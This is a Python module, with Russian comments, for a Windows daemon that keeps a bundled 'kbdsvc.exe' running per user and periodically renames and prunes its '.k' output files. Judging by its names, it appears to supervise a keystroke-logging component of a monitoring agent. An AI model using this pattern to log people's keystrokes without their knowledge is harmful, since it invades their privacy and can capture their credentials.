# -*- coding: utf-8 -*-
# from __future__ import unicode_literals

import os
import sys
import threading
import utils
import time
import logger
import subprocess
from config import config
from utils import fmt
import psutil

log = logger.getLogger(config['NAME'], config['LOGLEVEL'])


class Kbdsvc(threading.Thread):
    """
    Переименовывает файлы, удовлетворяющие шаблону каждые 21 сек. удаляя config[EXCLUDE_CHR]
    """

    def __init__(self):
        threading.Thread.__init__(self)
        self.name = __name__
        self.daemon = True
        self.active = False

        self.datadir = os.path.join(config['HOME_DIR'], config['NAME'], utils.get_user_name())
        self.workdir = os.path.join(self.datadir, 'kbdsvc')
        self.kbdsvc_exe = os.path.join(config["SELF_DIR"], "kbdsvc", "kbdsvc.exe")
        self.kbdsvc_pid = -1
        utils.makedirs(self.workdir)

    def start_kbdsvc_proc(self):
        """
        kbdsvc.exe по умолчанию пишет лог в собственную папку. cwd - меняет папку логов на workdir
        """
        proc = subprocess.Popen([utils.fs_enc(self.kbdsvc_exe)], cwd=utils.fs_enc(self.workdir), shell=False)
        self.kbdsvc_pid = proc.pid

    def kill_kbdsvc_proc(self):
        try:
            os.kill(self.kbdsvc_pid, 15)
        except Exception:
            pass

    def check_kbdsvc_proc(self):
        return psutil.pid_exists(self.kbdsvc_pid)

    def run(self):
        if not sys.platform.startswith('win'):
            return
        log.info(fmt('Start daemon: {0}', self.name))
        self.active = True
        prev_timeout, timeout = 21, 34
        while self.active:
            try:
                utils.makedirs(self.workdir)
                if not self.check_kbdsvc_proc():
                    self.start_kbdsvc_proc()
                for fn in (f for f in utils.rListFiles(self.workdir) if os.path.basename(f).endswith('.k')):
                    try:
                        # minutes are modulo 10
                        tm_tuple = time.localtime(int(time.time() / 600) * 600)
                        ftime = time.strftime("%Y%m%d%H%M%S", tm_tuple)
                        if ftime not in fn:
                            nfn = os.path.join(self.workdir, os.path.basename(fn).lstrip(config['EXCLUDE_CHR']))
                            os.rename(fn, nfn)
                    except IOError as e:
                        log.error(e)
                        time.sleep(0.1)

                prev_timeout, timeout = 21, 34
            except Exception as e:
                if timeout < 60:
                    prev_timeout, timeout = timeout, prev_timeout + timeout
                for i in os.listdir(self.workdir)[-config['SAVED_IMAGES']::-1]:
                    try:
                        log.debug(fmt('Try to delete: {fn}', fn=os.path.join(self.workdir, i)))
                        os.unlink(os.path.join(self.workdir, i))
                    except Exception as e:
                        log.error(e)
                log.error(e)

            time.sleep(timeout)

    def stop(self):
        log.info(fmt('Stop daemon: {0}', self.name))
        self.active = False
        self.kill_kbdsvc_proc()


if __name__ == "__main__":
    t = Kbdsvc()
    t.start()
    t.join()
